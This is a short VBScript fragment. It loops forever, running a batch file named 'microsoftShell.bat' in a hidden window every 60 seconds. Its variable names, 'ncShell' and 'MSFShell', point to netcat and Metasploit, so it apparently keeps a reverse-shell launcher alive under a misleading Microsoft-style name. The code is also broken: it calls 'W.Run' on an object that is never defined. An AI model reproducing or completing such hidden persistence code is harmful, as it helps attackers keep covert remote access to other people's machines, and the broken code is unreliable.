Dim ncShell
Set MSFShell = WScript.CreateObject("WScript.shell")

Do while True:
	W.Run "C:\temp\microsoftShell.bat", 0, true
	WScript.Sleep(60000)
loop